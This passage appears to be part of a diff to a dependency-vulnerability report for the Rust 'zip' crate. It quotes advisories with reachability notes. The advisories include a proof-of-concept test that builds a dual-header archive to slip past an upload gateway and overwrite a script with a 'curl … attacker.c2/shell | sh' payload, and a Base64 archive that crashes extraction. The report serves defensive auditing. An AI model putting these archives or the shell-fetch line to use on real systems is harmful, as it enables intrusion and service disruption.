```rust\n  // src/read/stream.rs\n  fn visit_file<R: Read>(&mut self, file: &mut ZipFile<'_, R>) -> ZipResult<()> {\n      file.safe_prepare_path(&self.outpath, &mut outpath, None::<&(_, fn(&Path) -> bool)>)?;\n      let mut outfile = fs::File::create(&outpath)?;\n      io::copy(file, &mut outfile)?;\n      Ok(())\n  }\n  ```\n- `src/write.rs:L1552`: The crate explicitly exposes `shallow_copy_file`, an API that constructs dual-header desynchronizations by adding a new CDFH entry with an alias name pointing to an existing file without updating the original LFH.\n\n### Threat Scenario & Severity Justification (10.0 / 9.9 Critical)\n1. **Security Control Evasion:** An adversary crafts a ZIP archive where:\n   - Central Directory Header declares: `doc_report.pdf` (Clean document)\n   - Local File Header declares: `cron_worker.sh` (Malicious root backdoor)\n2. The archive is uploaded through a web portal or API endpoint protected by security gateways (WAF, Anti-Virus, Content Disarm & Reconstruction). The security gateway inspects the archive using `ZipArchive` (or similar CDFH-first parsers), detects only `doc_report.pdf`, and approves the file.\n3. The backend worker or cloud function receives the approved archive and extracts it using `ZipStreamReader::extract`. `ZipStreamReader` reads the LFH and overwrites `cron_worker.sh`.\n4. **Full Compromise (CIA = High):** The legitimate production health checker / service script is destroyed (**Availability = High / DoS**), while the attacker's backdoor payload is implanted (**Integrity = High / RCE**).\n\n---\n\n## Proof of Concept\nThe following automated integration test reproducibly demonstrates the complete CVSS 10.0 / 9.9 exploit chain (Security Gateway Evasion -> Arbitrary File Overwrite -> RCE & DoS) against `zip2`:\n\n```rust\nuse std::fs;\nuse std::io::{Cursor, Write};\nuse tempfile::tempdir;\nuse zip::unstable::stream::ZipStreamReader;\nuse zip::write::SimpleFileOptions;\nuse zip::{ZipArchive, ZipWriter};\n\n// Simulated Security Gateway (inspects CDFH via ZipArchive)\nfn security_gateway_inspection(archive_bytes: &[u8]) -> Result<(), String> {\n    let mut archive = ZipArchive::new(Cursor::new(archive_bytes)).unwrap();\n    for i in 0..archive.len() {\n        let name = archive.by_index(i).unwrap().name().unwrap().to_string();\n        if name.ends_with(\".sh\") || name.ends_with(\".exe\") {\n            return Err(format!(\"MALWARE DETECTED: '{}' blocked!\", name));\n        }\n        if !name.ends_with(\".pdf\") {\n            return Err(\"Policy violation: only PDFs allowed!\".into());\n        }\n    }\n    Ok(())\n}\n\n#[test]\nfn test_cvss_9_9_dual_header_exploit_chain() {\n    // 1. Victim server setup: existing critical script\n    let victim_env = tempdir().unwrap();\n    let victim_dir = victim_env.path();\n    let target_script = victim_dir.join(\"cron_worker.sh\");\n    fs::write(&target_script, b\"#!/bin/sh\\n# PRODUCTION SERVICE\\necho 'SERVICE HEALTHY'\\n\").unwrap();\n\n    // 2. Attacker crafts Single-Entry Dual-Header Archive\n    // LFH: \"cron_worker.sh\" | CDFH: \"doc_report.pdf\"\n    let mut payload = Cursor::new(Vec::new());\n    let mut writer = ZipWriter::new(&mut payload);\n    writer.start_file(\"cron_worker.sh\", SimpleFileOptions::default()).unwrap();\n    writer.write_all(b\"#!/bin/sh\\ncurl -s https://c2/shell | sh\\necho 'PWNED ROOT'\\n\").unwrap();\n    writer.finish().unwrap();\n\n    let mut malicious_zip = payload.into_inner();\n    let cdh = malicious_zip.windows(4).position(|s| s == b\"PK\\x01\\x02\").unwrap();\n    malicious_zip[cdh + 46..cdh + 46 + 14].copy_from_slice(b\"doc_report.pdf\");\n\n    // 3. Gateway Inspection (Bypassed!)\n    assert!(security_gateway_inspection(&malicious_zip).is_ok());\n\n    // 4. Backend Extraction (ZipStreamReader)\n    ZipStreamReader::new(Cursor::new(&malicious_zip)).extract(victim_dir).unwrap();\n\n    // 5. Impact Verification\n    let compromised = fs::read_to_string(&target_script).unwrap();\n    assert!(!compromised.contains(\"SERVICE HEALTHY\")); // DoS Confirmed\n    assert!(compromised.contains(\"PWNED ROOT\"));       // RCE Confirmed\n}\n```\n\n### Verified Test Execution Output\n```text\nrunning 1 test\n==================================================================\nDual-Header Security Gateway Evasion\nExploit Chain: Gateway Evasion -> Arbitrary Overwrite -> RCE & DoS\n==================================================================\n[VICTIM SERVER STATE - BEFORE ATTACK]\nExisting Content:\nSERVICE IS RUNNING NORMALLY\n\n--- [STEP 1: SECURITY GATEWAY INSPECTION] ---\n[SECURITY GATEWAY] Auditing entry #0: 'doc_report.pdf'\n[GATEWAY VERDICT]: Ok(())\n[VULNERABILITY PROOF 1/3]: Security gateway was 100% BLIND to 'cron_worker.sh'!\n\n--- [STEP 2: BACKEND EXTRACTION (ZipStreamReader)] ---\nBackend server unzips approved archive into production directory.\n\n--- [STEP 3: POST-ATTACK IMPACT VERIFICATION] ---\n[VICTIM SERVER STATE - AFTER ATTACK]\nCompromised Content:\ncurl -s https://attacker.c2/shell | sh\necho 'PWNED: FULL ROOT TAKEOVER'\n```\n\n---\n\n## Impact\nAn attacker can construct a crafted archive whose Central Directory displays a benign filename (doc_report.pdf) that is inspected and approved by upstream security gateways (antivirus scanners, mail filters, upload firewalls), while automated backend ingestion pipelines or microservices using ZipStreamReader extract an arbitrary or malicious file (overwriting e.g. cron_worker.sh or critical system binaries). Because an adversary can overwrite existing files on disk, this vulnerability leads to Security Control Bypass, Arbitrary File Overwrite, Complete Denial of Service, and Remote Code Execution (RCE) in situations where a tool relying on the central directory trusts a tool that relied on the local file headers or vice-versa.\n\n**Who is Impacted:**\n- Automated ingestion microservices, SaaS platforms, and backend workers that extract user-submitted ZIP files.\n- Enterprise architectures where security verification (AV scanning, extension whitelisting) is decoupled from extraction (e.g. gateway audits Central Directory via CDFH before handing off extraction to streaming extractors).\n- Containerized workloads where overwriting local configuration files or executable scripts leads to host/container escape and complete service disruption.",
+        "enrichments": [
+          {
+            "cvss_scores": [
+              10.0
+            ],
+            "cvss_vectors": [
+              "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:L"
+            ],
+            "details": "## Summary\nA critical architectural parser differential exists in the `zip` crate (`<= 9.0.4`) between random-access archive readers (`ZipArchive`) and streaming readers (`ZipStreamReader`). `ZipArchive` considers the Central Directory File Header (CDFH) authoritative and ignores the filename declared in the Local File Header (LFH). In contrast, `ZipStreamReader` relies exclusively on the Local File Header (LFH) when extracting files to the filesystem.\n\nThis discrepancy enables ZIP archives to appear to have different file paths and contents according to which tool is reading them.\n\n---\n\n## Details\n\n### Architectural Root Cause\nIn the PKWARE ZIP archive format, every file entry is defined in two distinct locations:\n1. **Local File Header (LFH):** Precedes the compressed payload of each file in the body of the archive.\n2. **Central Directory File Header (CDFH):** Stored in a contiguous index at the end of the archive.\n\nIn `zip2`:\n- `src/read/zip_archive.rs`: `ZipArchive` parses the central directory into `SharedBuilder.files`. All file lookups by index or name read exclusively from the CDFH table, completely ignoring the filename present in the LFH.\n- `src/read/stream.rs:L86-L141`: `ZipStreamReader::visit` and `ZipStreamReader::extract` read sequentially from the stream without verifying the central directory index. Each entry is parsed via `read_zipfile_from_stream` and written to disk using the unverified filename declared in the LFH:\n  ```rust\n  // src/read/stream.rs\n  fn visit_file<R: Read>(&mut self, file: &mut ZipFile<'_, R>) -> ZipResult<()> {\n      file.safe_prepare_path(&self.outpath, &mut outpath, None::<&(_, fn(&Path) -> bool)>)?;\n      let mut outfile = fs::File::create(&outpath)?;\n      io::copy(file, &mut outfile)?;\n      Ok(())\n  }\n  ```\n- `src/write.rs:L1552`: The crate explicitly exposes `shallow_copy_file`, an API that constructs dual-header desynchronizations by adding a new CDFH entry with an alias name pointing to an existing file without updating the original LFH.\n\n### Threat Scenario & Severity Justification (10.0 / 9.9 Critical)\n1. **Security Control Evasion:** An adversary crafts a ZIP archive where:\n   - Central Directory Header declares: `doc_report.pdf` (Clean document)\n   - Local File Header declares: `cron_worker.sh` (Malicious root backdoor)\n2. The archive is uploaded through a web portal or API endpoint protected by security gateways (WAF, Anti-Virus, Content Disarm & Reconstruction). The security gateway inspects the archive using `ZipArchive` (or similar CDFH-first parsers), detects only `doc_report.pdf`, and approves the file.\n3. The backend worker or cloud function receives the approved archive and extracts it using `ZipStreamReader::extract`. `ZipStreamReader` reads the LFH and overwrites `cron_worker.sh`.\n4. **Full Compromise (CIA = High):** The legitimate production health checker / service script is destroyed (**Availability = High / DoS**), while the attacker's backdoor payload is implanted (**Integrity = High / RCE**).\n\n---\n\n## Proof of Concept\nThe following automated integration test reproducibly demonstrates the complete CVSS 10.0 / 9.9 exploit chain (Security Gateway Evasion -> Arbitrary File Overwrite -> RCE & DoS) against `zip2`:\n\n```rust\nuse std::fs;\nuse std::io::{Cursor, Write};\nuse tempfile::tempdir;\nuse zip::unstable::stream::ZipStreamReader;\nuse zip::write::SimpleFileOptions;\nuse zip::{ZipArchive, ZipWriter};\n\n// Simulated Security Gateway (inspects CDFH via ZipArchive)\nfn security_gateway_inspection(archive_bytes: &[u8]) -> Result<(), String> {\n    let mut archive = ZipArchive::new(Cursor::new(archive_bytes)).unwrap();\n    for i in 0..archive.len() {\n        let name = archive.by_index(i).unwrap().name().unwrap().to_string();\n        if name.ends_with(\".sh\") || name.ends_with(\".exe\") {\n            return Err(format!(\"MALWARE DETECTED: '{}' blocked!\", name));\n        }\n        if !name.ends_with(\".pdf\") {\n            return Err(\"Policy violation: only PDFs allowed!\".into());\n        }\n    }\n    Ok(())\n}\n\n#[test]\nfn test_cvss_9_9_dual_header_exploit_chain() {\n    // 1. Victim server setup: existing critical script\n    let victim_env = tempdir().unwrap();\n    let victim_dir = victim_env.path();\n    let target_script = victim_dir.join(\"cron_worker.sh\");\n    fs::write(&target_script, b\"#!/bin/sh\\n# PRODUCTION SERVICE\\necho 'SERVICE HEALTHY'\\n\").unwrap();\n\n    // 2. Attacker crafts Single-Entry Dual-Header Archive\n    // LFH: \"cron_worker.sh\" | CDFH: \"doc_report.pdf\"\n    let mut payload = Cursor::new(Vec::new());\n    let mut writer = ZipWriter::new(&mut payload);\n    writer.start_file(\"cron_worker.sh\", SimpleFileOptions::default()).unwrap();\n    writer.write_all(b\"#!/bin/sh\\ncurl -s https://c2/shell | sh\\necho 'PWNED ROOT'\\n\").unwrap();\n    writer.finish().unwrap();\n\n    let mut malicious_zip = payload.into_inner();\n    let cdh = malicious_zip.windows(4).position(|s| s == b\"PK\\x01\\x02\").unwrap();\n    malicious_zip[cdh + 46..cdh + 46 + 14].copy_from_slice(b\"doc_report.pdf\");\n\n    // 3. Gateway Inspection (Bypassed!)\n    assert!(security_gateway_inspection(&malicious_zip).is_ok());\n\n    // 4. Backend Extraction (ZipStreamReader)\n    ZipStreamReader::new(Cursor::new(&malicious_zip)).extract(victim_dir).unwrap();\n\n    // 5. Impact Verification\n    let compromised = fs::read_to_string(&target_script).unwrap();\n    assert!(!compromised.contains(\"SERVICE HEALTHY\")); // DoS Confirmed\n    assert!(compromised.contains(\"PWNED ROOT\"));       // RCE Confirmed\n}\n```\n\n### Verified Test Execution Output\n```text\nrunning 1 test\n==================================================================\nDual-Header Security Gateway Evasion\nExploit Chain: Gateway Evasion -> Arbitrary Overwrite -> RCE & DoS\n==================================================================\n[VICTIM SERVER STATE - BEFORE ATTACK]\nExisting Content:\nSERVICE IS RUNNING NORMALLY\n\n--- [STEP 1: SECURITY GATEWAY INSPECTION] ---\n[SECURITY GATEWAY] Auditing entry #0: 'doc_report.pdf'\n[GATEWAY VERDICT]: Ok(())\n[VULNERABILITY PROOF 1/3]: Security gateway was 100% BLIND to 'cron_worker.sh'!\n\n--- [STEP 2: BACKEND EXTRACTION (ZipStreamReader)] ---\nBackend server unzips approved archive into production directory.\n\n--- [STEP 3: POST-ATTACK IMPACT VERIFICATION] ---\n[VICTIM SERVER STATE - AFTER ATTACK]\nCompromised Content:\ncurl -s https://attacker.c2/shell | sh\necho 'PWNED: FULL ROOT TAKEOVER'\n```\n\n---\n\n## Impact\nAn attacker can construct a crafted archive whose Central Directory displays a benign filename (doc_report.pdf) that is inspected and approved by upstream security gateways (antivirus scanners, mail filters, upload firewalls), while automated backend ingestion pipelines or microservices using ZipStreamReader extract an arbitrary or malicious file (overwriting e.g. cron_worker.sh or critical system binaries). Because an adversary can overwrite existing files on disk, this vulnerability leads to Security Control Bypass, Arbitrary File Overwrite, Complete Denial of Service, and Remote Code Execution (RCE) in situations where a tool relying on the central directory trusts a tool that relied on the local file headers or vice-versa.\n\n**Who is Impacted:**\n- Automated ingestion microservices, SaaS platforms, and backend workers that extract user-submitted ZIP files.\n- Enterprise architectures where security verification (AV scanning, extension whitelisting) is decoupled from extraction (e.g. gateway audits Central Directory via CDFH before handing off extraction to streaming extractors).\n- Containerized workloads where overwriting local configuration files or executable scripts leads to host/container escape and complete service disruption.",
+            "epss_scores": [
+              0.0032,
+              0.24843
+            ],
+            "severity": "critical",
+            "source": "github",
+            "vulnerable_functions": []
+          },
+          {
+            "cvss_scores": [
+              10.0
+            ],
+            "cvss_vectors": [
+              "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:L/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+            ],
+            "details": "zip is a zip library for Rust that supports reading and writing simple ZIP files. Through 9.0.4, ZipArchive treats Central Directory File Header filenames as authoritative while ZipStreamReader extracts using Local File Header filenames without reconciling the duplicate metadata in src/read/stream.rs. A crafted archive can therefore appear benign to a component that inspects the central directory but cause a streaming extractor to write a different attacker-selected path and content, potentially overwriting files used by a downstream service. This issue is fixed in version 9.0.5.",
+            "epss_scores": [],
+            "severity": "critical",
+            "source": "nvd",
+            "vulnerable_functions": []
+          },
+          {
+            "cvss_scores": [
+              10.0
+            ],
+            "cvss_vectors": [
+              "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:L"
+            ],
+            "details": "",
+            "epss_scores": [],
+            "severity": "critical",
+            "source": "osv",
+            "vulnerable_functions": []
+          }
+        ],
+        "fixed_versions": [
+          "9.0.5"
+        ],
+        "id": "GHSA-M665-V7PM-7GRJ",
+        "modified": "2026-10-28T21:30:05.902127150Z",
+        "references": [
+          "https://github.com/advisories/GHSA-m665-v7pm-7grj",
+          "https://github.com/zip-rs/zip2",
+          "https://github.com/zip-rs/zip2/commit/8068ab480ccf8daa7411424e365fcdbe6d09443e",
+          "https://github.com/zip-rs/zip2/releases/tag/v9.0.5",
+          "https://github.com/zip-rs/zip2/security/advisories/GHSA-m665-v7pm-7grj",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-115905"
+        ],
+        "severity": "critical",
+        "source": "osv",
+        "withdrawn": false
+      },
+      "kev": false,
+      "package": {
+        "bom_ref": null,
+        "direct": true,
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip@6.0.0",
+        "scope": "runtime",
+        "version": "6.0.0"
+      },
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#zip-api-call-sites (ZipStreamReader is never constructed; only ZipArchive reads archives)"
+      ]
+    },
+    {
+      "advisory": {
+        "affected_packages": [
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "9.0.0"
+            ],
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "0.0.0-0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "9.0.0"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          }
+        ],
+        "affected_ranges": [
+          "fixed:9.0.0",
+          "introduced:0.0.0-0"
+        ],
+        "aliases": [
+          "GHSA-VV5M-JXXH-4627"
+        ],
+        "details": "The `zip` crate preserves privileged Unix permission bits (SUID, SGID, and sticky bits) from ZIP `external_attributes` during extraction, instead of masking them to safe permission bits. If a privileged process (for example, `root` in an installer, CI/CD pipeline, or container build) extracts an attacker-controlled ZIP archive using `ZipArchive::extract()` or the stream extraction API, files can be created as setuid-root or setgid. This behavior allows the creation of SUID/SGID files during extraction, which can lead to local privilege escalation depending on the execution environment.\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-vv5m-jxxh-4627\nCargo patched constraints (OR): >=9.0.0",
+        "enrichments": [
+          {
+            "cvss_scores": [
+              7.3
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H"
+            ],
+            "details": "",
+            "epss_scores": [],
+            "severity": "high",
+            "source": "osv",
+            "vulnerable_functions": []
+          }
+        ],
+        "fixed_versions": [
+          "9.0.0"
+        ],
+        "id": "RUSTSEC-2026-0367",
+        "modified": "2026-10-16T23:30:02.392172556Z",
+        "references": [
+          "https://crates.io/crates/zip",
+          "https://rustsec.org/advisories/RUSTSEC-2026-0367.html"
+        ],
+        "severity": "high",
         "source": "cargo-audit;osv",
         "withdrawn": false
       },
       "kev": false,
       "package": {
         "bom_ref": null,
-        "direct": false,
+        "direct": true,
         "ecosystem": "crates.io",
-        "name": "time",
-        "purl": "pkg:cargo/time@0.3.54",
-        "scope": "unknown",
-        "version": "0.3.54"
+        "name": "zip",
+        "purl": "pkg:cargo/zip@6.0.0",
+        "scope": "runtime",
+        "version": "6.0.0"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#zip-api-call-sites (no extract() or stream extraction call site)"
+      ]
+    },
+    {
+      "advisory": {
+        "affected_packages": [
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "9.0.0"
+            ],
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "0.0.0-0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "9.0.0"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          }
+        ],
+        "affected_ranges": [
+          "fixed:9.0.0",
+          "introduced:0.0.0-0"
+        ],
+        "aliases": [
+          "GHSA-4V9H-P7M9-RH26"
+        ],
+        "details": "In `zip` 9.0.0-pre2, `ZipArchive::extract` creates a symbolic link from an archive entry after validating only the output entry path. The link target bytes are passed directly to the platform symlink API, so a malicious archive can create an entry inside the destination that resolves to an attacker-chosen path outside it. This behavior was verified on macOS and Linux. On either platform, a subsequent application read or write through that extracted entry accesses the external target with the extracting process's permissions.\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-4v9h-p7m9-rh26\nCargo patched constraints (OR): >=9.0.0",
+        "enrichments": [],
+        "fixed_versions": [
+          "9.0.0"
+        ],
+        "id": "RUSTSEC-2026-0368",
+        "modified": "2026-10-16T23:30:02.383750571Z",
+        "references": [
+          "https://crates.io/crates/zip",
+          "https://rustsec.org/advisories/RUSTSEC-2026-0368.html"
+        ],
+        "severity": "unknown",
+        "source": "cargo-audit;osv",
+        "withdrawn": false
+      },
+      "kev": false,
+      "package": {
+        "bom_ref": null,
+        "direct": true,
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip@6.0.0",
+        "scope": "runtime",
+        "version": "6.0.0"
+      },
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#zip-api-call-sites (no extract() call site)"
+      ]
+    },
+    {
+      "advisory": {
+        "affected_packages": [
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "9.0.0"
+            ],
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "0.0.0-0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "9.0.0"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          }
+        ],
+        "affected_ranges": [
+          "fixed:9.0.0",
+          "introduced:0.0.0-0"
+        ],
+        "aliases": [
+          "GHSA-4684-H2Q9-2VCP"
+        ],
+        "details": "`ZipStreamReader::extract()` applies Unix permissions through extracted symlinks without validating the symlink target stays within the destination\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-4684-h2q9-2vcp\nCargo patched constraints (OR): >=9.0.0",
+        "enrichments": [
+          {
+            "cvss_scores": [
+              9.1
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+            ],
+            "details": "",
+            "epss_scores": [],
+            "severity": "critical",
+            "source": "osv",
+            "vulnerable_functions": []
+          }
+        ],
+        "fixed_versions": [
+          "9.0.0"
+        ],
+        "id": "RUSTSEC-2026-0369",
+        "modified": "2026-10-16T23:30:02.387698467Z",
+        "references": [
+          "https://crates.io/crates/zip",
+          "https://rustsec.org/advisories/RUSTSEC-2026-0369.html"
+        ],
+        "severity": "critical",
+        "source": "cargo-audit;osv",
+        "withdrawn": false
+      },
+      "kev": false,
+      "package": {
+        "bom_ref": null,
+        "direct": true,
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip@6.0.0",
+        "scope": "runtime",
+        "version": "6.0.0"
+      },
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#zip-api-call-sites (ZipStreamReader::extract is never called)"
+      ]
+    },
+    {
+      "advisory": {
+        "affected_packages": [
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "9.0.0"
+            ],
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "1.3.0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "9.0.0"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          },
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "9.0.0"
+            ],
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "0.0.0-0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "9.0.0"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          }
+        ],
+        "affected_ranges": [
+          "fixed:9.0.0",
+          "introduced:0.0.0-0",
+          "introduced:1.3.0"
+        ],
+        "aliases": [
+          "CVE-2026-115909",
+          "GHSA-Q7V9-X93C-XQV3"
+        ],
+        "details": "`ZipArchive::extract()` sizes the symlink-target buffer from the uncompressed\nsize declared in the central directory record, before reading a single byte of\nentry data:\n\n```rust\nlet mut target = Vec::with_capacity(file.size() as usize);\n```\n\nBoth inputs are attacker-controlled. `ZipFile::size()` returns\n`uncompressed_size` verbatim from the central directory, widened to a full `u64`\nby a ZIP64 extended-information extra field, and is never cross-checked against\nthe compressed size, the remaining archive length, or any platform-appropriate\nbound for a symlink target. `ZipFile::is_symlink()` is decided entirely by the\n`S_IFLNK` bit of the external-attributes field.\n\n`Vec::with_capacity()` is infallible: when the reservation is refused it calls\n`handle_alloc_error()` and aborts the process. This is not a Rust panic. It is\nnot caught by `catch_unwind()`, is unaffected by `panic = \"unwind\"`, and is not\ncontained by running the call on a worker thread.\n\nA 112-byte archive is sufficient. One `Stored` entry flagged `S_IFLNK` with a\nZIP64 field declaring `uncompressed_size = 2^62` and a zero-byte payload makes\n`extract()` fail with:\n\n```\nmemory allocation of 4611686018427387904 bytes failed\nAborted (core dumped)          # exit 134\n```\n\nThe declared value only needs to exceed the host's address space, not its RAM:\n`Vec::with_capacity()` maps address space without touching pages, so resident\nmemory stays flat and the abort happens on the refused reservation itself. Under\na `ulimit -v` cap or a memory-constrained container the threshold drops far\nenough that a plain 32-bit `uncompressed_size` with no ZIP64 field suffices.\n\nApplications that extract archives from untrusted input are affected on Unix and\nWindows targets with default features and no special configuration: upload\nhandling, mail-attachment processing, package and artefact ingestion, backup\nrestore and container-image layer extraction. No confidentiality or integrity\nproperty is affected: there is no memory unsafety, no out-of-bounds access, no\ndisclosure and no data corruption.\n\nThe fix landed in [zip-rs/zip2#984](https://github.com/zip-rs/zip2/pull/984) and\nshipped in 9.0.0.\n\nFor further details see: https://github.com/zip-rs/zip2/security/advisories/GHSA-q7v9-x93c-xqv3\nCargo patched constraints (OR): >=9.0.0",
+        "enrichments": [
+          {
+            "cvss_scores": [
+              7.5
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            ],
+            "details": "### Summary\n\nThe symbolic-link branch of `ZipArchive::extract_internal()` allocates a buffer using an attacker-declared size before reading any entry data. A 112-byte archive terminates the extracting process with `SIGABRT` through this infallible allocation.\n\n### Details\n\n```rust\n#[cfg(any(unix, windows))]\nif file.is_symlink() {\n    let mut target = Vec::with_capacity(file.size() as usize); // @audit unbounded memory allocation\n    file.read_to_end(&mut target)?;\n    drop(file);\n    make_symlink(&outpath, &target, &self.shared.files)?;\n    continue;\n}\n```\n\n[`src/read/mod.rs#L399-L405`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L399-L405) (reviewed commit `6f09b306`); the same code is at [`src/read.rs#L417-L418`](https://github.com/zip-rs/zip2/blob/v8.6.0/src/read.rs#L417-L418) in released v8.6.0.\n\nBoth inputs are attacker-controlled:\n\n- [`ZipFile::size()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L243-L246) returns `uncompressed_size` verbatim from the central directory record. A ZIP64 extended-information extra field widens it to a full `u64` ([`src/read/mod.rs#L619-L625`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L619-L625)). It is never cross-checked against the compressed size, the remaining archive length, or any platform-appropriate bound for a symlink target.\n- [`ZipFile::is_symlink()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L256-L260) is decided entirely by the central directory's external-attributes field, via the `S_IFLNK` bit.\n\n**Memory allocation failure → uncatchable process abort.** The reservation is sized from the declared `uncompressed_size` before a single byte of the entry is read. `Vec::with_capacity()` is infallible: on allocator refusal it calls `handle_alloc_error()`, which aborts the process. This is not a Rust panic — it is not caught by `catch_unwind()`, is unaffected by `panic = \"unwind\"`, and is not contained by isolating the call in a worker thread. This was verified by wrapping the call in all three at once; the process still died with exit 134.\n\nThe declared value needed is a property of the host's address space, not of reachability. On a 64 GB host with heuristic overcommit, declared sizes from roughly `2^38` upward abort reliably. Sizes at or above `2^63` instead trip `Vec`'s internal capacity check and produce a *catchable* `capacity overflow` panic, so an attacker simply avoids that band. The reproducer declares `2^62`, which exceeds the 47-bit user address space of x86-64 Linux outright and therefore aborts deterministically regardless of installed RAM or overcommit policy. Under a `ulimit -v` cap or a memory-constrained container the threshold drops far enough that a plain 32-bit `uncompressed_size` with no ZIP64 field suffices — a virtual-memory limit lowers the bar rather than mitigating the defect.\n\nThis is process termination, not memory exhaustion: `Vec::with_capacity()` only maps address space and never touches pages, so resident memory stays flat and the abort happens on the refused reservation itself, before any byte is read.\n\n### PoC\n\nThe reproducer consists of the following `zip` harness and payload. It requires only the `zip` crate; use a standard Base64 decoder to materialise the archive before running it.\n\n```toml\n[package]\nname = \"zip-poc\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nzip = \"8.6.0\"\n```\n\n```rust\nuse std::{env, fs::File, io::BufReader};\n\nfn main() {\n    let archive_path = env::args().nth(1).expect(\"usage: poc <archive.zip>\");\n    let outdir = std::env::temp_dir().join(\"zip-poc\");\n    std::fs::create_dir_all(&outdir).unwrap();\n\n    let file = File::open(archive_path).unwrap();\n    let mut archive = zip::ZipArchive::new(BufReader::new(file)).unwrap();\n    let r = archive.extract(&outdir);            // <-- process dies here\n    println!(\"SURVIVED: {:?}\", r);\n}\n```\n\nSave the Base64 payload below as `archive.b64`, remove its whitespace, decode it with a standard Base64 decoder (for example, `base64 -d archive.b64 > archive.zip` on Linux), and run `cargo run --release -- archive.zip`.\n\n**Uncatchable abort — 112 bytes.** One `Stored` entry named `a`; external attributes `0xA1FF0000` (`S_IFLNK|0777`); ZIP64 extra field declaring `uncompressed_size = 2^62`; zero-byte payload. sha256 `0c68c3934f22651a6bd2726f7d58140124b1839196a1d0ae468864cdfda74676`.\n\n```\nUEsDBC0AAAAAAAAAAAAAAAAAAAAAAP////8BAAAAYVBLAQItAy0AAAAAAAAAAAAAAAAAAAAAAP//\n//8BAAwAAAAAAAAAAAD/oQAAAABhAQAIAAAAAAAAAABAUEsFBgAAAAABAAEAOwAAAB8AAAAAAA==\n```\n\nObserved on x86-64 Linux, rustc 1.93.1, release profile, against both the reviewed commit and released v8.6.0:\n\n```\nentries=1\nmemory allocation of 4611686018427387904 bytes failed\nAborted (core dumped)          # exit 134\n```\n\nThe `SURVIVED` line never prints. Wrapping `extract()` in `catch_unwind` inside a spawned thread with `panic = \"unwind\"` produces the identical outcome.\n\n### Impact\n\nApplications running on Unix or Windows targets that call `ZipArchive::extract()` on attacker-supplied input are affected, with default features and no special configuration. The malicious 112-byte archive causes an unrecoverable, uncatchable termination of the extracting process, repeatable at will and not mitigable at the call site with `catch_unwind`, a worker thread, or a pre-flight metadata 